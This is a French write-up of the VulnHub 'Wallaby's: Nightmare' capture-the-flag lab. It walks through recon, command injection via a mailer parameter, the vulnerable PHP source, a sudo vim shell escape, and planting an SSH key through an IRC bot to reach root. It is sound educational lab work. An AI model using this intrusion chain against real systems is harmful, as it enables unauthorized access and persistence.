---
title: "Solution du CTF Wallaby's: Nightmare de VulnHub"
tags: [VulnHub, CTF]
---

[Wallaby's: Nightmare](https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/) a été un CTF... original. Le scénario, c'est que l'on doit s'introduire dans le serveur de *Wallaby,* mais qu'il peut détecter l'attaque et nous rendre la tache plus difficile.

Nmap voit initialement deux ports ouverts (22 et 80) ainsi qu'un port IRC filtré.

## Say my name

Sur la page du site, un formulaire nous demande un pseudo :

```html

<title>Wallaby's Server</title>
<script>function post(path, params, method) {
    method = method || "post"; // Set method to post by default if not specified.

    // The rest of this code assumes you are not using a library.
    // It can be made less wordy if you use one.
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
         }
    }

    document.body.appendChild(form);
    form.submit();
}
</script>

<h5>Enter a username to get started with this CTF! </h5> <br /><form name="nickname" action="" method="post">
<input type="text" name="yourname" value="" />
<input type="submit" name="submit" value="Submit" />
</form>

```

Une fois renseigné, on est redirigé vers l'URL `http://192.168.56.151/?page=home`

La présence du paramètre `page` laisse clairement supposer qu'il y a une faille de directory traversal mais malheureusement dès que l'on met une chaine avec un slash en valeur le serveur nous éjecte : impossible de se reconnecter au port 80.

En relançant un scan Nmap on découvre cette fois un port `60080`. La page d'index est différente, mais il semble que le paramètre `page` soit toujours accepté.

J'ai d'abord tenté d'attaquer la saisie du pseudonyme. L'opération est à faire en deux temps, d'abord envoyer une requête qui provoque une remise à zéro :

```console
curl 'http://192.168.56.151:60080/?page=index' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://192.168.56.151:60080' \
  -H 'Referer: http://192.168.56.151:60080/?page=index' \
  --data-raw 'change=Submit'
```

Et ensuite envoyer la nouvelle valeur :

```console
curl 'http://192.168.56.151:60080/?page=index' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://192.168.56.151:60080' \
  -H 'Referer: http://192.168.56.151:60080/?page=index' \
  --data-raw 'yourname=yolo&submit=Submit'
```

Comme le pseudo se reflétait dans différentes pages, j'ai tenté d'injecter du PHP ou un code SSI (Server Side Include) sans succès.

Faute de pouvoir traverser les dossiers j'ai bruteforcé le paramètre `page` avec des mots du dictionnaire :

```console
$ ffuf -u "http://192.168.56.151:60080/?page=FUZZ" -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt  -fs 922

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.151:60080/?page=FUZZ
 :: Wordlist         : FUZZ: fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 922
________________________________________________

home                    [Status: 200, Size: 1170, Words: 222, Lines: 31]
contact                 [Status: 200, Size: 895, Words: 182, Lines: 27]
index                   [Status: 200, Size: 1385, Words: 281, Lines: 39]
mailer                  [Status: 200, Size: 1108, Words: 206, Lines: 30]
blacklist               [Status: 200, Size: 1017, Words: 204, Lines: 28]
:: Progress: [119601/119601] :: Job [1/1] :: 2205 req/sec :: Duration: [0:00:57] :: Errors: 0 ::
```

La page retournée si on spécifie la valeur `mailer`  est intéressante, car un commentaire PHP laisse supposer qu'on peut passer un argument à une commande `mail`.

```html
    <!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
    <!--Better finish implementing this so
```

Et effectivement, c'est le cas. L'injection de commande est directe : la commande passée à l'argument `mail` est directement exécutée, nul besoin d'échappement.

## Comment ça marche

La curiosité me pousse à regarder comment tout ceci fonctionne.

```
www-data@ubuntu:/var/www/html$ ls -alR
.:
total 96
drwxr-xr-x 3 www-data www-data  4096 Apr  2 13:57 .
drwxr-xr-x 3 root     root      4096 Dec 16  2016 ..
-rw-r--r-- 1 root     root     15953 Aug 11  2015 eye.jpg
-rw-r--r-- 1 root     root      3639 Dec 27  2016 index.php
drwxr-xr-x 2 root     root      4096 Dec 27  2016 s13!34g$3FVA5e@ed
-rw-r--r-- 1 root     root     57626 Dec 27  2016 sec.png
-rw-r--r-- 1 www-data www-data    31 Apr  2 13:57 uname.txt

./s13!34g$3FVA5e@ed:
total 44
drwxr-xr-x 2 root     root     4096 Dec 27  2016 .
drwxr-xr-x 3 www-data www-data 4096 Apr  2 13:57 ..
-rw-r--r-- 1 root     root      339 Dec 27  2016 althome.php
-rw-r--r-- 1 root     root      698 Dec 27  2016 blacklist.php
-rw-r--r-- 1 root     root       78 Dec 16  2016 contact.php
-rw-r--r-- 1 root     root      371 Dec 16  2016 first_visit.php
-rw-r--r-- 1 root     root      379 Dec 16  2016 home.php
-rw-r--r-- 1 root     root     1350 Dec 27  2016 honeypot.php
-rw-r--r-- 1 root     root      213 Dec 15  2016 index.php
-rw-r--r-- 1 root     root      461 Dec 16  2016 mailer.php
-rw-r--r-- 1 root     root      667 Dec 16  2016 welcome.php
```

D'abord la page d'index :

```php
<?php
# basic webpage routing
$page = filter_input(INPUT_GET, 'page');
$open = fopen("/var/www/html/uname.txt", "r");
$levelone = "/var/www/html/levelone.txt";
$username = fgets($open);
$ip = $_POST['ip'];

# whitelist webpage filter
$webpageWhitelist = ['index', 'contact', 'home', 'blacklist', 'mailer', 'name'];


# Begin filtering the $page variable
if ($page === "name" and file_exists($levelone)) {
    include('/var/www/html/uname.txt');
}
elseif ($page === "home" and file_exists($levelone)) {
    include('s13!34g$3FVA5e@ed/home.php');
}
elseif ($page === "home" or isset($page) === false and !file_exists($levelone)) {
    include('s13!34g$3FVA5e@ed/althome.php');
}
elseif (in_array($page, $webpageWhitelist, true) === true and $page !== "name") {

    # If the web page is on the whitelist. Show it.
    include "s13!34g$3FVA5e@ed/{$page}.php";
}
elseif (isset($page) === false) {

    # Or else, IF the web page variable is NULL/Not Set. Assume home page is wanted.
    include 's13!34g$3FVA5e@ed/index.php';
}
elseif (strpos($page, '/etc/passwd') !== false) {
    include 's13!34g$3FVA5e@ed/honeypot.php';
}
elseif (strpos($page, '/') !== false and file_exists($levelone)) {
    echo "<h2>That's some fishy stuff you're trying there <em>{$username}</em>buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...</h2>
         <br />(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)";
    system('rm /var/www/html/levelone.txt');
}
elseif (strpos($page, '/') !== false) {
    echo "<h2>Nice try <em>{$username}</em>buddy, this vector is patched!</h2>";
}
elseif (strpos($page, '\'') !== false) {
    echo "<script>window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;   //compatibility for firefox and chrome
    var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};
    pc.createDataChannel(\"\");    //create a bogus data channel
    pc.createOffer(pc.setLocalDescription.bind(pc), noop);    // create offer and set local description
    pc.onicecandidate = function(ice){  //listen for candidate events
        if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
        var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
        alert('Your ip is ' + myIP + ', consider it blacklisted for a bit :D.');
        post('/?page=blacklist', {bl: myIP});
        pc.onicecandidate = noop;
    };</script>
    <noscript>Wtf...where'd you go <em>{$username}</em></noscript>";
}
else {

    # Or else, we will show them a 404 web page instead
    #include 'pages/errors/404.php';
    echo "<h2>Dude, <em>{$username}</em> what are you trying over here?!</h2>";
}
?>
```

On voit effectivement que l'on pouvait difficilement agir sur le paramètre `page`. Il y a une logique de première visite et de degré de sécurité gérée à l'aide de fichiers.

Le switch des ports se fait dans le script `blacklist.php`. L'utilisation du `sudo` est ici intéressante :

```php
<?php
$bl = $_POST['bl'];
$open = fopen("/var/www/html/uname.txt", "r");
$username = fgets($open);
$levelone = "/var/www/html/levelone.txt";

echo "Ban is on for $bl <br />";
echo "<h2>You are SOOOOOOOOOOO predictable <em>{$username}</em> :D. Won't get the machine like this, I can see your every move! And your IP :D</h2>";
ob_flush();
flush();
if (isset($bl) and file_exists($levelone)) {
    system("sudo iptables -A INPUT -s {$bl} -p tcp --destination-port 80 -j DROP");
    sleep(60);
    system("sudo iptables -D INPUT 3");
}
elseif (isset($bl)) {
    system("sudo iptables -A INPUT -s {$bl} -p tcp --destination-port 60080 -j DROP");
    sleep(60);
    system("sudo iptables -D INPUT 3");
}
```

La réinitialisation du pseudo se fait dans `welcome.php` :

```php
if ( isset( $_POST['change'] ) ) {
    system("rm /var/www/html/uname.txt");
    header("Refresh:0");
}
?>
```

Et l'écriture dans `first_visit.php` d'où les deux étapes.

```php
<?php
if (empty($_POST['yourname'])) {
echo '<h5>Enter a username to get started with this CTF! </h5> <br />';
echo '<form name="nickname" action="" method="post">
<input type="text" name="yourname" value="" />
<input type="submit" name="submit" value="Submit" />
</form>';
}
else {
system("echo '{$_POST['yourname']}' > /var/www/html/uname.txt");
header("Refresh:0");
}
```

## Internet Relay Circus

Jetons donc un œil aux permissions `sudo` :

```console
www-data@ubuntu:/var/www/html/s13!34g$3FVA5e@ed$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables
```

La permission Vim est intéressante, car on pourrait faire exécuter un shell avec `:!/bin/bash`

```bash
sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
```

Une fois connecté en tant que `waldo` je trouve un script `irssi` (qui est un client IRC pour terminal) et une session `tmux` existante.

```console
waldo@ubuntu:~$ cat irssi.sh
#!/bin/bash
tmux new-session -d -s irssi
tmux send-keys -t irssi 'n' Enter
tmux send-keys -t irssi 'irssi' Enter
waldo@ubuntu:~$ tmux ls
irssi: 1 windows (created Sun Apr  2 12:09:16 2023) [80x23]
```

Il est possible de se rattacher à la session avec `tmux attach -t irssi` :

![VulnHub Wallaby Nightmare tmux session](/assets/img/vulnhub/walliby_waldo_tmux_session.png)

Pas grand-chose d'intéressant. Heureusement en allant sur la seconde fenêtre (voir [sheatsheet Tmux](https://tmuxcheatsheet.com/)) je découvre un autre chan avec un bot qui semble présent :

![VulnHUb Wallaby Nightmare tmux IRC chatbot](/assets/img/vulnhub/walliby_irssi_second_window.png)

Je peux ouvrir une session de dialogue avec le bot (`/privmsg`) mais je ne connais pas la syntaxe pour lui faire exécuter des commandes.

Dans les processus je trouve un programme qui m'est inconnu nommé `Sopel` :

```
sopel      860  0.0  3.2 482852 33020 ?        Ssl  12:09   0:01 /usr/bin/python3 /usr/bin/sopel -c /etc/sopel.cfg
```

Il a un fichier de configuration, mais ce n'est pas vraiment parlant. La base _sqlite_ mentionnée m'est aussi inaccessible.

```ini
[core]
nick = Sopel
host = localhost
owner =  
homedir = /var/lib/sopel
db_filename = /var/lib/sopel/default.db

[db]
userdb_type = sqlite
userdb_file = /var/lib/sopel/default.db
```

`Sopel` est bien un bot IRC, écrit en Python. Je trouve cette référence qui me laisse supposer que les commandes doivent être préfixées d'un point : [Using the meetbot plugin - Sopel](https://sopel.chat/usage/meetbot-plugin/)

Et effectivement ça fonctionne :

```
14:32 <waldo> .help
14:32 <wallabysbot> You can see more info about any of these commands by doing .help <command> (e.g. .help time)
14:32 <wallabysbot> ADMIN         set  mode  join  quit  me  msg  part  save
14:32 <wallabysbot> ADMINCHANNEL  tmask  showmask  kick  kickban  quiet  unquiet  topic
14:32 <wallabysbot>               ban  unban
14:32 <wallabysbot> ANNOUNCE      announce
14:32 <wallabysbot> CORETASKS     useserviceauth  blocks
14:32 <wallabysbot> HELP          help
14:32 <wallabysbot> RUN           run
14:32 <waldo> .help RUN
14:32 <wallabysbot> waldo: e.g. .run ls
14:32 <waldo> .run id
14:32 <wallabysbot> b'uid=1001(wallaby) gid=1001(wallaby) groups=1001(wallaby),4(adm) '
```

Malheureusement les commandes doivent se limiter à un seul mot :

```
14:35 <waldo> .run uname -a
14:35 <wallabysbot> FileNotFoundError: [Errno 2] No such file or directory: 'uname -a' (file "/usr/lib/python3.5/subprocess.py", line 1551, in _execute_child)
```

J'ai donc placé ce script dans `/tmp` :

```bash
#!/bin/bash
mkdir -p /home/wallaby/.ssh/
echo ssh-rsa AAAAB3N--- snip ma clé publique ssh ---flmWnV7Ez8/h >> /home/wallaby/.ssh/authorized_keys
```

Et je l'ai fait exécuter par le bot pour qu'il m'ajoute aux personnes autorisées pour le compte. Ce dernier est administrateur donc passer `root` ne pose aucun problème :

```console
$ ssh -i ~/.ssh/key_no_pass  wallaby@192.168.56.151
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Dec 30 10:23:27 2016 from 192.168.56.153
wallaby@ubuntu:~$ id
uid=1001(wallaby) gid=1001(wallaby) groups=1001(wallaby),4(adm)
wallaby@ubuntu:~$ sudo -l
Matching Defaults entries for wallaby on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wallaby may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
wallaby@ubuntu:~$ sudo su
root@ubuntu:/home/wallaby# cd /root
root@ubuntu:~# ls
backups  check_level.sh  flag.txt
root@ubuntu:~# cat flag.txt
###CONGRATULATIONS###

You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.

Thanks guys!
-Waldo
```
